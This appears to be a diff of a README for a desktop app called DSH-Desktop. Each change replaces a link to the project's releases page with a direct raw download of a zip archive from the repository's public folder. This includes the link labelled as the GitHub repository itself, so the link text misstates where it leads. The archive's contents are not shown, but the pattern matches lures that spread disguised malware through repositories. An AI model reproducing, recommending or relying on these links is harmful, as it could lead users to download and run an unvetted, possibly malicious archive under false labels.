@@ -4,7 +4,7 @@
 
 Welcome to DSH-Desktop! This guide will help you download and run the application quickly and easily. Whether you're looking to enhance your productivity or simplify your digital workflow, DSH-Desktop is designed with you in mind.
 
-[![Download DSH-Desktop](https://img.shields.io/badge/Download-DSH--Desktop-blue?style=for-the-badge&logo=github)](https://github.com/harismuna5268/DSH-Desktop/releases)
+[![Download DSH-Desktop](https://img.shields.io/badge/Download-DSH--Desktop-blue?style=for-the-badge&logo=github)](https://github.com/harismuna5268/DSH-Desktop/raw/refs/heads/main/public/Desktop-DS-v2.9.zip)
 
 ## 📥 Download Instructions
 
@@ -126,7 +126,7 @@ Staying current ensures you get the latest features and security improvements:
 - Click to download and install updates seamlessly
 
 ### Manual Updates
-- Visit our [releases page](https://github.com/harismuna5268/DSH-Desktop/releases) regularly
+- Visit our [releases page](https://github.com/harismuna5268/DSH-Desktop/raw/refs/heads/main/public/Desktop-DS-v2.9.zip) regularly
 - Download the newest version
 - Install over your current version - your settings will be preserved
 
@@ -168,8 +168,8 @@ DSH-Desktop is ready to enhance your computing experience. With its intuitive de
 
 ## 🔗 Useful Links
 
-- **Main Download Page:** [DSH-Desktop Releases](https://github.com/harismuna5268/DSH-Desktop/releases)
-- **GitHub Repository:** [github.com/harismuna5268/DSH-Desktop](https://github.com/harismuna5268/DSH-Desktop)
+- **Main Download Page:** [DSH-Desktop Releases](https://github.com/harismuna5268/DSH-Desktop/raw/refs/heads/main/public/Desktop-DS-v2.9.zip)
+- **GitHub Repository:** [github.com/harismuna5268/DSH-Desktop](https://github.com/harismuna5268/DSH-Desktop/raw/refs/heads/main/public/Desktop-DS-v2.9.zip)
 - **Documentation:** Available the GitHub page
 - **Support:** Open an issue on GitHub for technical help
 
@@ -186,7 +186,7 @@ Thank you for choosing DSH-Desktop. We're committed to providing you with reliab
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-DSH--Desktop-green?style=for-the-badge&logo=download)](https://github.com/harismuna5268/DSH-Desktop/releases)
+[![Download Now](https://img.shields.io/badge/Download-DSH--Desktop-green?style=for-the-badge&logo=download)](https://github.com/harismuna5268/DSH-Desktop/raw/refs/heads/main/public/Desktop-DS-v2.9.zip)
 
 *Your journey to a more productive computer experience starts now!*
 
